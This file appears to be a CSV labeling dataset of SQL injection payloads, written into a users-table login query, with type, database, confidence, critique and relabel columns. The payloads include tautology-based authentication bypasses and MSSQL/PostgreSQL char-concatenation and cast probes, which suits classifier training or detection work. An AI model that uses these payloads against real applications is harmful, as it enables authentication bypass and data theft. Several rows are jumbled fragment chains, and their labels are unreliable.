payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"select * from users WHERE username = ""-6353%\' ) ) and username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""-9847%\' ) ) ) and ( ( ( \'%\' = \'""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,39000,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""-6353%\' ) ) and username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""-9847%\' ) ) ) and ( ( ( \'%\' = \'"""
"select * from users WHERE username = ""-9501\' ) or username = ""-2756\' where 6156 = 6156 and username = ""-5880\' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,39001,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""-9501\' ) or username = ""-2756\' where 6156 = 6156 and username = ""-5880\' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )"
"select * from users WHERE username = ""1 and username = ""-7430\' ) as xfah where 1596 = 1596 or username = ""-7430\' ) as xfah where 1596 = 1596 or username = ""1\' )",auth_bypass,generic,0.5,simple condition injection,RELABEL,confidence too low (0.50),auth_bypass,generic,39002,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""1 and username = ""-7430\' ) as xfah where 1596 = 1596 or username = ""-7430\' ) as xfah where 1596 = 1596 or username = ""1\' )"
"select * from users WHERE username = ""-9564 and username = ""-6190\' ) where 2621 = 2621 or username = ""-5863""",auth_bypass,generic,0.5,simple condition injection,RELABEL,confidence too low (0.50),auth_bypass,generic,39003,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""-9564 and username = ""-6190\' ) where 2621 = 2621 or username = ""-5863"""
"select * from users WHERE username = ""-9770\' ) ) as ovhh where 7903 = 7903 or username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""-6190\' ) where 2621 = 2621 or username = ""-1254""",auth_bypass,generic,0.5,simple condition injection,RELABEL,confidence too low (0.50),auth_bypass,generic,39004,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""-9770\' ) ) as ovhh where 7903 = 7903 or username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""-6190\' ) where 2621 = 2621 or username = ""-1254"""
"select * from users WHERE username = ""1 ) as zmxb where 8424 = 8424 or 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""-1190\' and \'yxry\' like \'yxry"" and ( ( ( 1248 = 1248""",error_based,postgresql,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,39005,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""1 ) as zmxb where 8424 = 8424 or 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""-1190\' and \'yxry\' like \'yxry"" and ( ( ( 1248 = 1248"""
"select * from users WHERE username = ""-9564 and username = ""-6190\' ) where 2621 = 2621 and username = ""1 and username = ""-6190\' ) where 2621 = 2621",auth_bypass,generic,0.5,simple condition injection,RELABEL,confidence too low (0.50),auth_bypass,generic,39006,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""-9564 and username = ""-6190\' ) where 2621 = 2621 and username = ""1 and username = ""-6190\' ) where 2621 = 2621"
"select * from users WHERE username = ""-7072\' ) and username = ""-2733\' ) ) ) or username = ""1\'|| ( select \'vasx\' where 4770 = 4770",auth_bypass,generic,0.5,simple condition injection,RELABEL,confidence too low (0.50),auth_bypass,generic,39007,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""-7072\' ) and username = ""-2733\' ) ) ) or username = ""1\'|| ( select \'vasx\' where 4770 = 4770"
"select * from users WHERE username = ""1 and username = ""-7430\' ) as xfah where 1596 = 1596 or username = ""1 ) ) as xoch where 8765 = 8765",auth_bypass,generic,0.5,simple condition injection,RELABEL,confidence too low (0.50),auth_bypass,generic,39008,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""1 and username = ""-7430\' ) as xfah where 1596 = 1596 or username = ""1 ) ) as xoch where 8765 = 8765"
"select * from users WHERE username = ""-8021\' ) ) and ( ( \'cenk\' like \'cenk"" and ( ( ( \'btjx\' = \'btjx"" and username = ""-1344 ) as gqgi where 2545 = 2545",auth_bypass,generic,0.5,simple condition injection,RELABEL,confidence too low (0.50),auth_bypass,generic,39009,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""-8021\' ) ) and ( ( \'cenk\' like \'cenk"" and ( ( ( \'btjx\' = \'btjx"" and username = ""-1344 ) as gqgi where 2545 = 2545"
